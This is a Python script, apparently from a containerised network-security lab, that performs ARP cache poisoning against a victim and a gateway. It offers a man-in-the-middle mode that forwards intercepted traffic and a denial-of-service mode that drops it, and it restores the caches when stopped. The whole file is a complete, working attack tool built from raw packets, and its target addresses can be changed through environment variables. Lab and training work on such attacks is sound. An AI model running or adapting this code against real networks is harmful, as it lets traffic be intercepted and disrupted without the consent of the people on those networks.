#!/usr/bin/env python3
"""
arp_spoof.py  —  ARP poisoning / stop script for the attacker container.

Usage
-----
Start (long-running, blocks until SIGTERM / SIGINT or `stop` command):
    python3 /arp_spoof.py start --mode mitm
    python3 /arp_spoof.py start --mode dos

Stop (sends stop signal to a running instance and exits):
    python3 /arp_spoof.py stop

The backend calls both commands via `docker exec attacker python3 /arp_spoof.py …`

Modes
-----
mitm : Enable IP forwarding inside the container, send forged ARP replies to
       both victim and gateway, and log forwarded packets.
dos  : Same forged ARP replies but DROP forwarded packets (no IP forwarding).

IPs / MACs are read from the container's own network interfaces so this
script works correctly even if docker-compose.yml changes static IPs.
"""

from __future__ import annotations

import argparse
import fcntl
import logging
import os
import signal
import socket
import struct
import sys
import time
from pathlib import Path

# ─── Logging ──────────────────────────────────────────────────────────────────

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger("arp_spoof")

# ─── Paths ────────────────────────────────────────────────────────────────────

PID_FILE = Path("/tmp/arp_spoof.pid")
STOP_FILE = Path("/tmp/arp_spoof.stop")

# ─── Network topology (matches docker-compose.yml / lab.yaml) ─────────────────

VICTIM_IP = os.environ.get("VICTIM_IP", "10.10.10.10")
GATEWAY_IP = os.environ.get("GATEWAY_IP", "10.10.10.1")
IFACE = os.environ.get("IFACE", "eth0")

POISON_INTERVAL = 2.0   # seconds between gratuitous ARP bursts

# ─── MAC helpers (no scapy dependency for address lookup) ─────────────────────

def _get_mac(iface: str) -> str:
    """Return the MAC address of *iface* as a colon-separated string."""
    path = Path(f"/sys/class/net/{iface}/address")
    return path.read_text().strip()


def _get_ip(iface: str) -> str:
    """Return the primary IPv4 address of *iface*."""
    import socket, struct, fcntl
    SIOCGIFADDR = 0x8915
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        return socket.inet_ntoa(
            fcntl.ioctl(s.fileno(), SIOCGIFADDR, struct.pack("256s", iface[:15].encode()))[20:24]
        )
    finally:
        s.close()


def _resolve_ip_to_mac(ip: str) -> str | None:
    """
    Look up the MAC for *ip* from /proc/net/arp (kernel ARP cache).
    Returns None if not found.
    """
    try:
        with open("/proc/net/arp") as f:
            for line in f.readlines()[1:]:
                parts = line.split()
                if len(parts) >= 4 and parts[0] == ip and parts[3] != "00:00:00:00:00:00":
                    return parts[3]
    except OSError:
        pass
    return None


# ─── ARP packet construction ──────────────────────────────────────────────────

def _mac_to_bytes(mac: str) -> bytes:
    return bytes(int(x, 16) for x in mac.split(":"))


def _ip_to_bytes(ip: str) -> bytes:
    return socket.inet_aton(ip)


def _build_arp_reply(
    src_mac: str,
    src_ip: str,
    dst_mac: str,
    dst_ip: str,
) -> bytes:
    """
    Construct a raw ARP reply (gratuitous or targeted) without scapy.

    Ethernet II + ARP (28 bytes):
      dst_mac (6) + src_mac (6) + ethertype 0x0806 (2)
      + htype (2) + ptype (2) + hlen (1) + plen (1) + oper (2)
      + sha (6) + spa (4) + tha (6) + tpa (4)
    """
    eth = _mac_to_bytes(dst_mac) + _mac_to_bytes(src_mac) + b"\x08\x06"
    arp = (
        b"\x00\x01"                   # HTYPE: Ethernet
        b"\x08\x00"                   # PTYPE: IPv4
        b"\x06"                       # HLEN: 6
        b"\x04"                       # PLEN: 4
        b"\x00\x02"                   # OPER: reply
        + _mac_to_bytes(src_mac)      # SHA: sender MAC (liar's MAC)
        + _ip_to_bytes(src_ip)        # SPA: sender IP (victim of impersonation)
        + _mac_to_bytes(dst_mac)      # THA: target MAC
        + _ip_to_bytes(dst_ip)        # TPA: target IP
    )
    return eth + arp


def _send_raw(packet: bytes, iface: str) -> None:
    """Send *packet* on *iface* using a raw socket (requires NET_RAW capability)."""
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as sock:
        sock.bind((iface, 0))
        sock.send(packet)


BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


def _poison_once(attacker_mac: str, iface: str) -> None:
    """
    Send one round of forged ARP replies:
      - Tell victim:  gateway IP  is at attacker MAC
      - Tell gateway: victim  IP  is at attacker MAC
    """
    victim_mac = _resolve_ip_to_mac(VICTIM_IP) or BROADCAST_MAC
    gateway_mac = _resolve_ip_to_mac(GATEWAY_IP) or BROADCAST_MAC

    # Poison victim's cache: "gateway IP → attacker MAC"
    pkt1 = _build_arp_reply(attacker_mac, GATEWAY_IP, victim_mac, VICTIM_IP)
    _send_raw(pkt1, iface)

    # Poison gateway's cache: "victim IP → attacker MAC"
    pkt2 = _build_arp_reply(attacker_mac, VICTIM_IP, gateway_mac, GATEWAY_IP)
    _send_raw(pkt2, iface)

    log.info("Poisoned: victim cache (GW→attacker) + gateway cache (victim→attacker)")


def _restore_once(attacker_mac: str, iface: str) -> None:
    """
    Send corrective ARP replies to restore victim and gateway ARP caches
    to the correct mappings.
    """
    victim_mac = _resolve_ip_to_mac(VICTIM_IP) or BROADCAST_MAC
    gateway_mac = _resolve_ip_to_mac(GATEWAY_IP) or BROADCAST_MAC

    # Restore victim's cache: "gateway IP → real gateway MAC"
    pkt1 = _build_arp_reply(gateway_mac, GATEWAY_IP, victim_mac, VICTIM_IP)
    _send_raw(pkt1, iface)

    # Restore gateway's cache: "victim IP → real victim MAC"
    pkt2 = _build_arp_reply(victim_mac, VICTIM_IP, gateway_mac, GATEWAY_IP)
    _send_raw(pkt2, iface)

    log.info("Restored: victim cache (GW→real) + gateway cache (victim→real)")


# ─── IP forwarding / dropping ─────────────────────────────────────────────────

def _set_ip_forward(enable: bool) -> None:
    val = "1" if enable else "0"
    try:
        Path("/proc/sys/net/ipv4/ip_forward").write_text(val)
        log.info("IP forwarding: %s", "enabled" if enable else "disabled")
    except OSError as exc:
        log.warning("Could not set ip_forward: %s", exc)


# ─── Stop-file signalling ─────────────────────────────────────────────────────

def _write_pid() -> None:
    PID_FILE.write_text(str(os.getpid()))


def _remove_pid() -> None:
    PID_FILE.unlink(missing_ok=True)


def _request_stop() -> None:
    """Create the stop sentinel file so a running `start` loop exits cleanly."""
    STOP_FILE.touch()
    # Also try SIGTERM by PID
    if PID_FILE.exists():
        try:
            pid = int(PID_FILE.read_text().strip())
            os.kill(pid, signal.SIGTERM)
            log.info("Sent SIGTERM to pid %d", pid)
        except (ValueError, ProcessLookupError, PermissionError) as exc:
            log.warning("Could not signal running process: %s", exc)


def _should_stop() -> bool:
    return STOP_FILE.exists()


def _clear_stop() -> None:
    STOP_FILE.unlink(missing_ok=True)


# ─── Commands ─────────────────────────────────────────────────────────────────

def cmd_start(mode: str) -> None:
    _clear_stop()
    _write_pid()

    attacker_mac = _get_mac(IFACE)
    attacker_ip = _get_ip(IFACE)
    log.info(
        "Starting ARP spoof | mode=%s | iface=%s | attacker=%s (%s)",
        mode, IFACE, attacker_ip, attacker_mac,
    )
    log.info("Targets: victim=%s  gateway=%s", VICTIM_IP, GATEWAY_IP)

    if mode == "mitm":
        _set_ip_forward(True)
    else:  # dos
        _set_ip_forward(False)

    # Handle SIGTERM gracefully
    def _sigterm_handler(signum, frame):
        log.info("Received SIGTERM — stopping.")
        STOP_FILE.touch()

    signal.signal(signal.SIGTERM, _sigterm_handler)

    try:
        while not _should_stop():
            _poison_once(attacker_mac, IFACE)
            time.sleep(POISON_INTERVAL)
    finally:
        log.info("Sending corrective ARP replies to restore caches…")
        try:
            _restore_once(attacker_mac, IFACE)
        except Exception as exc:
            log.warning("Restore failed: %s", exc)
        _set_ip_forward(False)
        _remove_pid()
        _clear_stop()
        log.info("ARP spoof stopped.")


def cmd_stop() -> None:
    log.info("Requesting stop of running arp_spoof process…")
    _request_stop()
    # Wait briefly for the process to acknowledge
    deadline = time.time() + 8
    while time.time() < deadline:
        if not PID_FILE.exists():
            log.info("Process stopped cleanly.")
            return
        time.sleep(0.5)
    log.warning("Timed out waiting for process to stop (pid file still present).")


# ─── Entry point ──────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="ARP spoof controller")
    sub = parser.add_subparsers(dest="command", required=True)

    start_p = sub.add_parser("start", help="Start ARP poisoning")
    start_p.add_argument(
        "--mode",
        choices=["mitm", "dos"],
        required=True,
        help="mitm=forward+log, dos=drop packets",
    )

    sub.add_parser("stop", help="Stop a running ARP poisoning session")

    args = parser.parse_args()

    if args.command == "start":
        cmd_start(args.mode)
    elif args.command == "stop":
        cmd_stop()


if __name__ == "__main__":
    main()
